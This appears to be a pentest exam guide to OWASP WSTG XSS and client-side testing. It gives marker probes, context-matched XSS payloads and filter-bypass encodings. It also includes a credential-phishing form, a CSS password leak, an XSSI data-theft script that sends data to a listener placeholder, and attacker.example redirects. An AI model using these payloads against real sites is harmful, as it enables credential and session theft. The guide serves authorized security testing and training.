# Phase 2 – WSTG XSS & Client-Side: Walkthrough + Guide

**Tags:** `ASYNC` start at once, read later · `MANUAL` Burp/browser console, no automation replaces it · `EXTRA` only when a question or a blocker points to it. Every block keeps its WSTG ID.

**Colour code (on every step heading):** <span style="background:#b7e4c7;color:#000">&nbsp;🟩 Green = mandatory&nbsp;</span> run it on every entry point recon found, or as soon as the fact that triggers it appears (a branch, queued without waiting). <span style="background:#fff9b0;color:#000">&nbsp;🟨 Light yellow = optional&nbsp;</span> run it only when a question points to it, as a fallback, or if time allows. The emoji squares keep the code visible in viewers that ignore background colours.

**How to use it:** *Study* by reading the context lines and **Watch** notes. *Execute* by jumping to the commands/payloads and reading only the **Read** line. Blocks A–O follow the order you work in. Inside each block, core payloads come first and the ones with a *When* line are triggered extras. Every block ends with a **Next** column. It is a pointer, not a gate: the numbered stages in the *Summary* set the sequence, and a branch (DOM, CORS, clickjacking) is queued when its trigger shows, without waiting for it. **If it fails** points to a section of [📜 cheatsheet.md](<./📜 cheatsheet.md>). Worked, step-by-step examples for every payload class live in [🧪 LABS/xss.md](<./🧪 LABS/xss.md>) — read the matching lab when a payload here does not click. The question lookup, the discovery map and troubleshooting are at the end.

***

## Summary

**Goal.** Turn every entry point that Phase 1 recon found (parameters, forms, headers, cookies, JS sinks, upload fields, API bodies) into a confirmed client-side finding: reflected, stored or DOM XSS, or one of the thirteen other client-side weaknesses the WSTG groups alongside it (CORS, clickjacking, WebSockets, storage, cache, tabnabbing, RIA policy files). This phase does not discover new hosts or paths — it attacks the ones Phase 1 already mapped.

**Ground rules (they apply to every stage).**
- **Start from the Phase 1 inventory, not from scratch.** The Burp Site map, the GET/POST parameter list (block J of Phase 1) and every `.js` file already found are your worklist. A parameter this phase never sees is a parameter never tested.
- **Mark before you fire.** Every single payload is preceded, or wrapped, by a short unique string (`<MARKER>`). You confirm *where and how* input lands before you spend a payload on it — this is what separates "I think it's reflected" from "I can see `zzXSS9f2<` unencoded in a `<script>` block".
- **Context decides the payload, not the vulnerability class.** The same unmarked parameter can need `"><script>alert(1)</script>`, `"-alert(1)-"`, or `javascript:alert(1)` depending only on where it lands. Get the context first (block C), write the payload second (block D).
- **`alert(1)`/`alert(document.domain)` is proof, not the finding.** Once it fires, the finding is the *sink* (which page, which parameter, which context) — screenshot or copy the request/response, then move on. Do not spend time building a full exploit chain unless a question asks for one (block O).
- **Kali has no internet and Burp Community has no Collaborator.** Out-of-band exfiltration (cookie theft, keylogging) is demoed with your own listener on the exam network (`nc`, `python3 -m http.server`), never an external OAST domain.
- **A Kali reset wipes everything.** Copy confirmed payloads, requests and responses to the host PC as you go, same as Phase 1.

**Three ideas hold the process together.**
- **Marker discipline.** Every parameter, header and cookie gets a unique, grep-able string before it gets a payload. Without it you cannot tell a silent filter from a context you have not matched yet, and you cannot tell which of five injection points actually fired.
- **Context first, payload second.** HTML body, HTML attribute, JavaScript string, URL/`javascript:` sink, HTML comment — each needs a different breakout. The marker sweep (block B, C) exists to answer "where does it land and what does the server do to it" before a single real payload is sent.
- **Source → sink thinking for everything client-side.** Reflected and stored XSS are a server echoing input into HTML. DOM XSS, postMessage abuse, insecure storage and resource manipulation are the same idea moved into the browser: untrusted data (a *source*: `location.search`, `postMessage`, `localStorage`, a URL parameter) reaches a dangerous operation (a *sink*: `innerHTML`, `eval`, `document.write`, a `<script src>`, a WebSocket send) without being checked. Once you can name the source and the sink, the payload almost writes itself.

**Restart rule.** Every new entry point this phase itself turns up — a parameter inside a JS bundle, a stored field that renders on an admin page, a `postMessage` listener, a second role that sees different output — re-enters the process at block B (mark it, find its context, pick the payload).

**Root checks.** What every parameter, stored field and JS source gets, in this order: marker sent → context read from the response → payload matched to that context → persistence checked (does it survive a reload, a different page, a different role) (blocks B–F). This loop is what makes the sweep complete; skipping the context step is the single biggest cause of "the payload should have worked but didn't".

**The process in ten stages.** Each one says why it exists, what it hands to the next, and which block holds its payloads.

**Stage 0 · Prepare (block A).** Pull the entry-point list straight out of Phase 1: Burp Site map, the GET/POST parameter files, every `.js` URL, every cookie name. Decide your `<MARKER>` convention (short, unique per run, grep-able, e.g. `zzXSS<4 random chars>`). Start a listener and a tiny HTTP server for later demos. This stage touches no target traffic of its own; it makes every later step aimed at a real surface instead of guessed at.

**Stage 1 · Reflection sweep (block B; `WSTG-INPV-01` starts here).** Send the marker, alone, into every parameter, header and cookie from the Stage 0 list. Read the response for the marker. This answers one question only: does this input come back at all, and if so, how many times and roughly where. It is the cheapest test in the phase and it is what tells you which entry points are worth a context check.

**Stage 2 · Context and encoding check (block C).** For every parameter where the marker reflected, send a probe string made of the characters that matter (`<`, `>`, `"`, `'`, `` ` ``, `\`, `/`) and read exactly what the server did to each one. This is the step most people skip and the one that makes every later payload either fire on the first try or waste ten attempts. The output is one of five contexts (HTML body, HTML attribute, JS string, URL/`javascript:` sink, HTML comment) plus the encoding state (nothing encoded, `<>` encoded only, quotes escaped, fully encoded).

**Stage 3 · Reflected XSS (blocks D, E; `WSTG-INPV-01`).** Pick the payload for the context and encoding state found in Stage 2, confirm execution, then — only if the straightforward payload is blocked — move to allow-list enumeration and encoding tricks. Every hit here is one finding: `WSTG-INPV-01`, this parameter, this context.

**Stage 4 · Stored XSS (block F; `WSTG-INPV-02`).** Repeat the marker-then-context-then-payload loop, but now for every field that is written once and read back somewhere else: a comment, a profile field, a display name, a support ticket, a filename, a `User-Agent` or `Referer` that an admin panel logs. The extra step is *persistence*: write the marker, then load every page/role that could render it back, because the sink is often not the form you filled in.

**Stage 5 · DOM XSS (block G; `WSTG-CLNT-01`).** Switch from reading HTTP responses to reading JavaScript. Grep every inline script and `.js` file for a source (`location.search`, `location.hash`, `document.referrer`, `document.URL`, `window.name`, a `postMessage` handler) reaching a sink (`document.write`, `innerHTML`/`outerHTML`, `insertAdjacentHTML`, `eval`, `new Function`, a string passed to `setTimeout`/`setInterval`, jQuery `$()`/`.html()`/`.attr('href', …)`, a `location` assignment) with nothing in between. This never touches the server, so no WAF or backend filter applies — only client-side sanitisation does.

**Stage 6 · Adjacent injection classes (blocks H, I, J; `WSTG-CLNT-02, 03, 04, 05, 06, 13`).** Triggered when a context from Stage 2/5 is not plain HTML: a filter that strips `<script>` but not every tag still allows HTML injection and event-handler execution (block H); a parameter that controls a redirect or a CSS value opens open-redirect or CSS-exfiltration vectors instead (block I); a parameter that controls which script/stylesheet/iframe loads, or a JSON endpoint reachable cross-origin without checks, opens resource manipulation and script-inclusion vectors (block J). These are queued the moment their trigger shows and run alongside the main XSS sweep, not after it.

**Stage 7 · Cross-origin and framing (blocks K, L; `WSTG-CLNT-07, 09, 14`, `WSTG-CONF-08`).** Triggered by Phase 1 leftovers: a `crossdomain.xml`/`clientaccesspolicy.xml` found in Phase 1 block G gets its permissiveness checked here (block K); any API that sets `Access-Control-Allow-Origin` gets the credentialed-reflection test (block K); every page gets one shared check for `X-Frame-Options`/`frame-ancestors` (clickjacking, block L) and every external link with `target="_blank"` gets the `rel="noopener"` check (reverse tabnabbing, block L).

**Stage 8 · Real-time channels and client storage (blocks M, N; `WSTG-CLNT-10, 11, 12`, `WSTG-CONF-12`).** Triggered when Burp's HTTP history shows a `ws://`/`wss://` upgrade (block M, WebSockets), when a grep for `addEventListener('message'` or `.onmessage` turns up a handler (block M, Web Messaging), or simply on every target once (block N: what sits in `localStorage`/`sessionStorage`/cookies, and whether sensitive pages set `Cache-Control: no-store`).

**Stage 9 · Exploit chains and close out (block O).** Only when a question explicitly asks for an end-to-end chain (cookie theft, credential capture, a privileged action executed via the victim's session) do you build the full chain: listener, payload, delivery, capture. Otherwise, a confirmed `alert(document.domain)` plus the request/response is the finding. Close with a completeness pass per target and copy everything to the host PC.

**Where things run (never more than three channels, this phase is far lighter on background jobs than Phase 1).**
- **Burp Repeater, the main channel:** every marker send, every context probe, every payload. One tab per entry point, renamed, kept for the report.
- **Browser (same proxy, second window):** render confirmed payloads to watch them execute, read `localStorage`/`sessionStorage`/cookies in DevTools, and host the clickjacking/tabnabbing PoC pages.
- **A terminal:** `curl` for CORS/RIA-policy checks, `nc` or `python3 -m http.server` for the Stage 9 capture listener, `grep`/`awk` to search JS bundles for sources and sinks.

**Three questions to ask after every result.** (1) *Where did the marker land?* Body, attribute, script, comment, or nowhere. (2) *What does that context need?* The payload table in block D, or a branch in blocks H–N. (3) *Does it survive?* A reload, a different page, a different role — if yes, it is stored, not reflected, and the "where" changes the WSTG ID.

**What this phase is not.** It is not a second recon pass (new hosts/paths/parameters still belong to Phase 1's loop — send them there, then come back to mark them here) and it is not SQLi/auth/IDOR testing, even when the same parameter is also injectable there (those belong to their own phases; note the lead and move on).

**Four foundational techniques.** Every block below is one of them.

| Technique | What it is | Tools | Blocks |
|---|---|---|---|
| Marker injection & reflection mapping | A unique string into every parameter/header/cookie, then grep the response for it and count the hits | Burp Repeater/Intruder, curl, grep | B |
| Context-aware payload crafting | Match the payload to HTML body / attribute / JS string / URL / comment, then bypass whatever filter blocks the first attempt | Burp Repeater, browser | C, D, E |
| Persistence testing | Write once, read from a second request, a second page, or a second role, to tell reflected from stored | Burp (two sessions), browser | F |
| Source → sink tracing | Read JS for untrusted data (`location.*`, `postMessage`, storage) reaching a dangerous operation (`innerHTML`, `eval`, a `src`/`href` assignment) with no check between the two | Browser DevTools, grep, Burp (DOM Invader if present) | G, H, I, J, M |

On top of these sit the **cross-origin and channel checks** (CORS, RIA policy files, clickjacking, tabnabbing, WebSockets, Web Messaging, storage, cache) that run once per target regardless of whether any XSS was found, because they are independent WSTG items.

**What depends on what.** This is why the stage order above is fixed, not arbitrary.

| Step | Needs | Produces |
|---|---|---|
| Marker sweep | The Phase 1 entry-point list | Which parameters reflect, and how many times |
| Context check | A reflecting parameter | HTML body / attribute / JS / URL / comment + encoding state |
| Reflected payload | A context | Confirmed `WSTG-INPV-01` finding |
| Persistence test | A write surface (stored field) | Confirmed `WSTG-INPV-02` finding, and the viewer role it hits |
| Source → sink trace | A `.js` file or inline script | Confirmed `WSTG-CLNT-01` (DOM XSS) finding |
| CORS test | An endpoint that sets `Access-Control-Allow-Origin` | Confirmed/ruled-out `WSTG-CLNT-07` |
| Clickjacking PoC | A page missing `X-Frame-Options`/`frame-ancestors` | Confirmed `WSTG-CLNT-09` |
| Exploit chain | A confirmed sink + a question that asks for impact | Captured cookie/credential/token |

***

## Conventions

| Placeholder | Meaning |
|---|---|
| `<URL>` | The page or endpoint under test |
| `<PARAM>` | The parameter, field, or header name being marked/tested |
| `<MARKER>` | Your unique probe string for this run, e.g. `zzXSS9f2a` — short, unlikely to exist in the app, easy to grep |
| `<CONTEXT>` | Where the marker landed: HTML body, HTML attribute, JS string, URL/`javascript:` sink, HTML comment |
| `<PAYLOAD>` | The context-matched string from block D/E |
| `<SCHEME>` / `<VHOST>` / `<PORT>` | Same meaning as Phase 1 |
| `<COOKIE>` / `<PROXY>` | `PHPSESSID=...` / `127.0.0.1:8080`, same as Phase 1 |
| `<ROLE_A>` / `<ROLE_B>` | Two sessions/cookies (e.g. a normal user and an admin) used to confirm a stored payload is seen by a different viewer |
| `<JS_URL>` | Full URL of a `.js` file to grep for sources and sinks |
| `<WS_URL>` | A `ws://` or `wss://` endpoint seen in Burp's HTTP history |
| `<ORIGIN>` | An attacker-controlled Origin value sent to test CORS, e.g. `https://evil.example` |
| `<LISTENER_IP>` / `<LISTENER_PORT>` | Your own Kali IP and a free port, for the Stage 9 capture demo — the exam network, never an external host |

**Marker-and-context probe (every entry point gets this before a real payload):**
```text
zzXSS9f2a'"<>`\${{7*7}}
```
Pick apart the response character by character — this single string tells you, in one request, whether quotes are escaped, angle brackets are encoded, backticks/`${}` survive (template-literal/SSTI adjacent, flag for Phase 8), and whether your marker shows up once, twice, or inside a `.js` file instead of the HTML.

**What the server did to each character, and what it means**

| In the response | Context / encoding | Do |
|---|---|---|
| `<` and `>` intact | Unencoded, lands in HTML | Block D, HTML-body payload |
| `<` → `&lt;`, `>` → `&gt;`, but `"` intact | HTML-encoded body, attribute still open | Try an attribute breakout if the marker sits inside a tag; otherwise this input is not exploitable as classic XSS — note it and move on |
| `"` or `'` intact inside a `<tag attr="...">` | HTML attribute context | Block D, attribute-breakout payload |
| Marker appears inside `<script>...</script>` or a JS variable | JS string context | Block D, JS-string payload |
| Marker appears inside `href="javascript:..."` or a `location` assignment | URL/`javascript:` sink | Block D, URL-sink payload |
| Marker appears inside `<!-- ... -->` | HTML comment | Close the comment first (`-->`), then apply the body payload |
| Marker missing from the HTML but present in a `.js` response | Server-side value embedded in JS, or the marker is consumed client-side | Block G, source → sink trace |
| Marker not found anywhere | Not reflected at this point — filtered server-side, stored elsewhere, or dropped | Recheck spelling/encoding once, then try block F (it may be stored, not reflected) |

- **Burp scope and setup:** identical to Phase 1 (see [startup checklist](<../00-Exam-Setup-and-Proxies/startup-checklist.md>)). This phase lives almost entirely in Repeater: one tab per entry point, renamed to `<PARAM>-<CONTEXT>`.
- **Grep, not eyeballing, for reflections:** `grep -o "zzXSS9f2a.\{0,30\}"` on a saved response shows every hit plus the 30 characters that follow it — the fastest way to read context at a glance.
- **Two sessions for persistence:** keep `<ROLE_A>` (the account that submits the input) and `<ROLE_B>` (an admin/other-user account, or an incognito window) side by side. A payload that only `<ROLE_A>` ever sees again is reflected-looking-stored (e.g. an echoed success page) — confirm it actually persists across a fresh request before calling it stored.
- **`alert(document.domain)` over `alert(1)`** when a payload fires across more than one host/vhost — it tells you immediately which origin executed, which matters once CORS or multiple vhosts are in play.
- **Self-XSS does not count.** If the only way to trigger the payload is to inject it into your own session and view it yourself with no other user or role involved, it is not a finding — note it as a dead end and move on.
- **Save to file:** most of this phase is read directly in Burp/browser and needs no file. Save only the rare long JS bundle you grep offline: `curl -sk "<JS_URL>" -o recon/js-<NAME>.js`. Naming matches Phase 1: `recon/<tool>-<context>-<target>`.
- **Step format:** heading with tags, context line, marker/payload block, **Read** quote, optional **Watch** note, table (save flag, next action). Extra blocks add a *When* line. Main blocks add **If it fails**.

***

## A. Setup & input inventory

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Pull the worklist from Phase 1&nbsp;</span>

Two minutes, before any payload. This phase attacks entry points Phase 1 already found — it does not go looking for new ones.

```bash
mkdir -p recon
cat recon/ffuf-get-params-*.csv recon/ffuf-post-params-*.csv 2>/dev/null | awk -F, 'NR==1 || $5~/^(200|301|302)$/'
grep -rohE '<input[^>]*name="[^"]+"' recon/ 2>/dev/null | grep -oE 'name="[^"]+"' | sort -u
```

> **Read:** Your worklist is: every GET/POST parameter from Phase 1 block J, every form field and `.js` URL from the Burp Site map (Phase 1 block C), every cookie name, and any custom header Burp recorded (`X-Forwarded-For`, a tenant/locale header).
> **Watch:** A parameter this phase never marks is a parameter never tested. If Phase 1's parameter discovery was shallow on a target, go back and run it (Phase 1 block J) before assuming a page has nothing to test.

| Save to file | Next |
|:---:|---|
| `[ ]` | Decide the `<MARKER>` convention, then start the marker sweep (block B). |

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Listener and local web server for later demos&nbsp;</span>

Start these now so Stage 9 never blocks on "set up a listener first".

```bash
nc -nvlp <LISTENER_PORT>
python3 -m http.server 8000 --directory /tmp/xss-poc &
```

> **Watch:** Both point at your Kali IP on the exam network (no internet, no OAST). Keep the PoC HTML files in `/tmp/xss-poc` (see blocks L and O) so a Kali reset never costs you more than re-creating that folder.

| Save to file | Next |
|:---:|---|
| `[ ]` | Mark every entry point (block B). |

***

## B. Reflection & marker sweep

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Marker every parameter, header and cookie&nbsp;</span> · `WSTG-INPV-01` · `ASYNC`

Cheapest test in the phase. Send the marker alone, nothing else, and read whether it comes back.

```bash
curl -sk "<SCHEME>://<VHOST>/<URL>?<PARAM>=zzXSS9f2a" | grep -c "zzXSS9f2a"
curl -sk "<SCHEME>://<VHOST>/<URL>" -H "User-Agent: zzXSS9f2a" -H "Referer: zzXSS9f2a" -H "X-Forwarded-For: zzXSS9f2a" -b "<COOKIE>" | grep -c "zzXSS9f2a"
```

> **Read:** `0` = not reflected here (try block F, it may be stored elsewhere). `1` or more = reflected; move to the context probe (block C) for this exact parameter.
> **Watch:** Loop this over every parameter from block A in one pass — it is seconds per request, and you want the full reflection map before you spend time on context. For POST bodies and JSON, send the same marker as the value of every field, one field at a time.

| Save to file | Next |
|:---:|---|
| `[ ]` | Every reflecting parameter goes to block C (context check). Every non-reflecting one goes to block F (stored check) before being dropped. |

**If it fails →** cheatsheet: *Marker sweep variants* (Burp Intruder sniper, bulk curl loop).

***

## C. Context & encoding check

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Character probe on every reflecting parameter&nbsp;</span> · `WSTG-INPV-01`

The single most important step in the phase. Send the full probe, then read what each character became.

```bash
curl -sk --data-urlencode "<PARAM>=zzXSS9f2a'\"<>\`\\\${{7*7}}" "<SCHEME>://<VHOST>/<URL>" | grep -o "zzXSS9f2a.\{0,40\}"
```

> **Read:** Match the output against the *What the server did to each character* table in Conventions. Write down the context (HTML body / attribute / JS string / URL sink / comment) and the encoding state next to the parameter name — this is what block D reads to pick the payload.
> **Watch:** `${{7*7}}` surviving as literal text is normal here (not SSTI by itself) — it is only a flag to revisit this input in Phase 8 if nothing else explains it. Do not chase it now.

| Save to file | Next |
|:---:|---|
| `[ ]` | Context known → block D. Marker landed in a `.js` response instead of HTML → block G (DOM trace). |

**If it fails →** cheatsheet: *Context probe variants* (per content-type: JSON, XML, multipart).

***

## D. Reflected XSS payloads by context

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Context-matched payload table&nbsp;</span> · `WSTG-INPV-01`

Pick the row that matches block C's result. Replace the marker with the real payload and resend in Burp Repeater.

| Context | Encoding state | Payload | Confirms via |
|---|---|---|---|
| HTML body | Nothing encoded | `<script>alert(document.domain)</script>` | A popup on render |
| HTML body | `<script>` stripped, other tags pass | `<img src=x onerror=alert(document.domain)>` | A popup on render |
| HTML attribute (`value="..."`) | Quotes intact | `" onmouseover=alert(document.domain) x="` | Hover the element, or `autofocus onfocus=` for no-interaction |
| HTML attribute (`href="..."`) | Quotes intact | `javascript:alert(document.domain)` | Click the link |
| JS string (`var x = "...";`) | Quotes intact, no backslash escaping | `";alert(document.domain);//` | A popup on render |
| JS string | Quotes escaped (`\"`), but `</script>` not filtered | `</script><script>alert(document.domain)</script>` | A popup on render |
| URL / `javascript:` sink | — | `javascript:alert(document.domain)` | Click / auto-navigate |
| HTML comment | — | `--><script>alert(document.domain)</script><!--` | A popup on render |

> **Read:** A fired `alert()` is `WSTG-INPV-01` confirmed for this parameter and context. Copy the request/response pair into your notes immediately.
> **Watch:** If the exact row payload is blocked but the context is correct, the filter is active — go to block E before giving up on this parameter.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed → note the finding, move to the next entry point. Blocked → block E. |

**If it fails →** cheatsheet: *Payload bank* (longer per-context lists, polyglots).

***

## E. Filter & encoding bypass

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;Allow-list enumeration&nbsp;</span> · `WSTG-INPV-01` / `WSTG-CLNT-02`

*When:* the context-matched payload from block D is blocked or stripped. Find out what the filter actually allows instead of guessing.

```bash
for tag in script img svg body input iframe details math marquee; do curl -sk --data-urlencode "<PARAM>=<$tag x=zzXSS9f2a>" "<SCHEME>://<VHOST>/<URL>" | grep -q "zzXSS9f2a" && echo "$tag allowed"; done
for attr in onerror onload onfocus onmouseover onpointerover ontoggle; do curl -sk --data-urlencode "<PARAM>=<img $attr=zzXSS9f2a src=x>" "<SCHEME>://<VHOST>/<URL>" | grep -q "zzXSS9f2a" && echo "$attr allowed"; done
```

> **Read:** Whatever tag and attribute both survive gives you the new payload, e.g. an allowed `<svg>` plus `onload` → `<svg onload=alert(document.domain)>`. `details`+`ontoggle open` and `marquee`+`onstart` fire with no interaction when event handlers are otherwise filtered.
> **Watch:** A custom-tag-only filter (blocks every real HTML element) still executes via `<custom-tag onfocus=alert(1) tabindex=1>` rendered, then auto-focused — see [🧪 LABS/xss.md](<./🧪 LABS/xss.md>) `[PS-XSS-12]` for the worked case.

| Save to file | Next |
|:---:|---|
| `[ ]` | Rebuild the payload with the allowed tag/attribute and resend through block D. |

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;Encoding tricks&nbsp;</span> · `WSTG-INPV-01`

*When:* the filter blocks keywords (`script`, `on`, `javascript:`) literally rather than by character.

```text
Case variation:    <ScRiPt>alert(1)</ScRiPt>
Null/whitespace:   <img src=x o%00nerror=alert(1)>   <img src=x onerror
=alert(1)>
HTML entities:     <img src=x onerror=&#97;lert(1)>
JS string escapes: eval('\x61lert(1)')
URL encode once/twice when the value round-trips through a redirect or a stored field: %253Cscript%253E
```

> **Read:** Any variant that survives where the plain keyword did not confirms a naive string-match filter (not a parser-aware one).

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed bypass → block D payload table with the new wrapper. Still blocked → note as a competently filtered input and move on; a WAF is in play (Phase 1 block N / Phase 8). |

**If it fails →** cheatsheet: *Filter bypass cheatsheet* (full tag/attribute/encoding tables).

***

## F. Stored XSS

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Mark every write surface&nbsp;</span> · `WSTG-INPV-02`

Any field that is saved and rendered somewhere else: comments, profile/display name, bio, filename on upload, support ticket, product review, and logged headers (`User-Agent`, `Referer`, `X-Forwarded-For`) that an admin panel may display.

```bash
curl -sk "<SCHEME>://<VHOST>/<URL>" -b "<COOKIE>" --data-urlencode "<PARAM>=zzXSS9f2a"
```

> **Read:** A `200`/`302` confirms the write was accepted. This alone proves nothing about XSS yet — persistence does.
> **Watch:** Upload filenames are an easy miss: `zzXSS9f2a".jpg` or `"><script>alert(1)</script>.jpg` as the filename, not the file content, is what gets rendered back in a file-listing page.

| Save to file | Next |
|:---:|---|
| `[ ]` | Reload every page/role that could render this field (next step). |

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Confirm persistence across a page and a role&nbsp;</span> · `WSTG-INPV-02`

```bash
curl -sk "<SCHEME>://<VHOST>/<RENDER_URL>" -b "<ROLE_A>" | grep -o "zzXSS9f2a.\{0,40\}"
curl -sk "<SCHEME>://<VHOST>/<RENDER_URL>" -b "<ROLE_B>" | grep -o "zzXSS9f2a.\{0,40\}"
```

> **Read:** The marker surviving a fresh request (new cookie jar, or `<ROLE_B>`) is what makes it *stored* rather than an echoed confirmation page. Read the context exactly as in block C — a stored field is very often HTML-encoded on the submit confirmation but unencoded on the admin's review page.
> **Watch:** The highest-value stored XSS targets the page only an **admin** or a **different user** sees (an admin ticket queue, a moderation panel, another user's inbox) — always try `<ROLE_B>` even if `<ROLE_A>` alone looks encoded.

| Save to file | Next |
|:---:|---|
| `[ ]` | Persisted and reflecting the context's payload fires → block D payload for that context, confirmed as `WSTG-INPV-02`. Not persisted → drop, it was reflected-looking only. |

**If it fails →** cheatsheet: *Stored XSS write surfaces* (fuller list: metadata fields, CSV/export output, PDF generation, email templates).

***

## G. DOM XSS: source → sink

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Grep every script for sources and sinks&nbsp;</span> · `WSTG-CLNT-01`

This never touches the server. A WAF or a backend filter is irrelevant here — only the client-side code matters.

```bash
curl -sk "<SCHEME>://<VHOST>/<URL>" -o /tmp/page.html
grep -oE 'src="[^"]+\.js"' /tmp/page.html | sed 's/src="//;s/"$//' | while read j; do curl -sk "<SCHEME>://<VHOST>/$j" -o "recon/js-$(basename $j)"; done
grep -lE 'location\.(search|hash|href)|document\.(referrer|URL|cookie)|window\.name|postMessage' /tmp/page.html recon/js-*.js 2>/dev/null
grep -lE 'document\.write|innerHTML|outerHTML|insertAdjacentHTML|eval\(|new Function|setTimeout\(.*\$\(|setInterval\(.*\$\(|\.html\(|\.attr\(.*href' /tmp/page.html recon/js-*.js 2>/dev/null
```

> **Read:** A file matched by both greps is a candidate: open it and trace the variable from the source line to the sink line by hand. If the source value reaches the sink with no sanitising function (no `encodeURIComponent`, no `DOMPurify`, no allow-list check) in between, it is exploitable.
> **Watch:** Minified bundles defeat grep's readability but not its matching — search the minified file first, then open the same code un-minified in the browser DevTools (Sources tab, the `{}` pretty-print button) to actually read the trace.

| Save to file | Next |
|:---:|---|
| `[x]` (the `.js` files) | A confirmed source→sink pair goes to the matching browser-URL test below. |

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Trigger the sink from the URL&nbsp;</span> · `WSTG-CLNT-01`

```text
document.write sink, source location.search:   <SCHEME>://<VHOST>/<URL>?<PARAM>="><script>alert(document.domain)</script>
innerHTML sink, source location.search:        <SCHEME>://<VHOST>/<URL>?<PARAM>=<img src=x onerror=alert(document.domain)>
href/jQuery sink, source location.search:      <SCHEME>://<VHOST>/<URL>?<PARAM>=javascript:alert(document.domain)
Selector sink, source location.hash:           <SCHEME>://<VHOST>/<URL>#<img src=x onerror=alert(document.domain)>
```

> **Read:** Open the URL in the browser (not curl — the sink only runs client-side). A popup confirms `WSTG-CLNT-01` for this source/sink pair.
> **Watch:** `innerHTML` does not execute a bare `<script>` tag (HTML5 behaviour) — it needs an element with an inline event handler (`onerror`, `onload`) instead. `location.hash` payloads are never sent to the server at all, so they never show up in Burp's HTTP history — check the browser URL bar and DevTools directly.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed → note source, sink, and file/line. Not confirmed → check whether a sanitiser runs between source and sink (DOMPurify, a regex strip) and note it as mitigated. |

**If it fails →** cheatsheet: *DOM sources & sinks reference table* (full list), *DOM Invader* (if the Burp build has it).

***

## H. HTML injection & JS execution without `<script>`

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;HTML injection when script execution is fully blocked&nbsp;</span> · `WSTG-CLNT-03`

*When:* every tag/attribute/encoding trick in block E still fails — the output is genuinely non-executable, but raw HTML still injects.

```html
<h1>You have been logged out</h1><form action="http://<LISTENER_IP>:<LISTENER_PORT>/" method="post">Session expired, please log in again:<br>Username: <input name="user"><br>Password: <input type="password" name="pass"><br><input type="submit"></form>
```

> **Read:** Even with zero script execution, injected markup that overlays a fake login form or defaces the page is a finding on its own (`WSTG-CLNT-03`) — it does not need JS to be dangerous, only unescaped `<`/`>`.

| Save to file | Next |
|:---:|---|
| `[ ]` | Note the injected-HTML impact; it stands alone as a finding even without script execution. |

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;JS execution via non-script vectors&nbsp;</span> · `WSTG-CLNT-02`

*When:* the question specifically asks about JavaScript execution rather than markup injection (they overlap but are graded as separate WSTG items).

```text
javascript: URI on any clickable attribute:  href="javascript:alert(document.domain)"
data: URI with inline script (if allowed):   data:text/html,<script>alert(1)</script>
SVG with embedded script:                     <svg><script>alert(1)</script></svg>
```

| Save to file | Next |
|:---:|---|
| `[ ]` | Same as block D — confirm, note, move on. |

**If it fails →** cheatsheet: *HTML injection without execution* (defacement/phishing templates).

***

## I. Client-side redirects & CSS injection

#### 🟩 <span style="background:#b7e4c7;color:#000">&nbsp;Client-side open redirect&nbsp;</span> · `WSTG-CLNT-04`

*When:* a JS source (`location.search`, a `redirect`/`next`/`return` parameter) is assigned straight to `location`/`location.href`/`window.open` without an allow-list.

```text
<SCHEME>://<VHOST>/<URL>?<PARAM>=https://attacker.example
<SCHEME>://<VHOST>/<URL>?<PARAM>=//attacker.example
<SCHEME>://<VHOST>/<URL>?<PARAM>=javascript:alert(document.domain)
```

> **Read:** `//attacker.example` is the one people forget — protocol-relative, and parsed as external by every browser even when a filter only checks for `http`.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed redirect to an external host → finding. A `javascript:` value accepted here is also XSS (block D). |

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;CSS injection&nbsp;</span> · `WSTG-CLNT-05`

*When:* a parameter controls an inline `style` attribute or is reflected inside a `<style>` block, and script execution is blocked.

```css
</style><style>input[name=password][value^="a"]{background:url(http://<LISTENER_IP>:<LISTENER_PORT>/?leak=a);}</style>
```

> **Read:** This attribute-selector trick exfiltrates a value (e.g. a CSRF token or password rendered into the DOM) one character at a time via background-image requests to your listener — proof of concept is one matching request appearing in your `nc`/http.server log.

| Save to file | Next |
|:---:|---|
| `[ ]` | A single confirmed leak request is enough; do not build the full brute-force harness unless a question asks for the exact leaked value. |

**If it fails →** cheatsheet: *Open redirect & CSS injection payloads*.

***

## J. Resource manipulation & script inclusion

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;Client-side resource manipulation&nbsp;</span> · `WSTG-CLNT-06`

*When:* a parameter sets which script, stylesheet, or iframe `src` loads (a theming or "widget" parameter is the classic case).

```text
<SCHEME>://<VHOST>/<URL>?<PARAM>=//<LISTENER_IP>:<LISTENER_PORT>/evil.js
```

> **Read:** Host a one-line `alert(document.domain)` at `evil.js` on your `python3 -m http.server`. A fired alert means the app will load an attacker-controlled script, which is a full takeover of that page's origin — no further payload work needed.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed → finding. Not confirmed → check whether the value is validated against an allow-list of known scripts/themes. |

#### 🟨 <span style="background:#fff9b0;color:#000">&nbsp;Cross-site script inclusion (XSSI)&nbsp;</span> · `WSTG-CLNT-13`

*When:* a JS/JSONP endpoint returns user- or session-specific data and is reachable without a CSRF token or a same-origin check.

```html
<script src="<SCHEME>://<VHOST>/<API_PATH>?callback=steal"></script>
<script>function steal(data){ new Image().src="http://<LISTENER_IP>:<LISTENER_PORT>/?d="+encodeURIComponent(JSON.stringify(data)); }</script>
```

> **Read:** Host this on your local server and open it in a browser that also holds the target's session cookie (same browser, different tab, is enough for a PoC). A request with the victim's data arriving at your listener confirms the endpoint leaks cross-origin.
